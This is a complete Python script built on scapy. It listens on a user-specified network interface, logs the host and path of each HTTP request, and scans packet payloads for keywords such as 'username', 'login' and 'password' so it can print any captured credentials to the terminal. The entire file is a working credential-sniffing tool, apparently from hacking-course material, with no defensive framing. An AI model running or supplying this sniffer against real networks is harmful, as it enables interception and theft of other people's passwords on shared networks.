import scapy.all as scapy
from scapy.layers import http
import argparse
import colorama
from colorama import Fore
colorama.init()

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify an interface to listen on. For example eth0 or wlan0.")
    (options) = parser.parse_args()
    if not options.interface:
        parser.error(Fore.RED+"[-]"+Fore.RESET+" Please specify an interface to listen on.")
    return options

def sniffer(interface): #Listens on specified port
    print(Fore.YELLOW+"[+]"+Fore.RESET+f" Listening on interface {interface}\n")
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet): # Grabs URL
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet): # Gets credentials from packet
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "uname", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_packet(packet): # Filters packet for http & outputs data to the terminal
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(Fore.YELLOW+"[+]"+Fore.RESET+f" HTTP Request >> {url}")
        credentials_packet = get_credentials(packet)
        if credentials_packet:
            print(Fore.YELLOW+"\n\n[+]"+Fore.RESET+f" Credentials >> {credentials_packet}\n\n")

def main():
    options = get_arguments()
    sniffer(options.interface)

if __name__ == "__main__":
    main()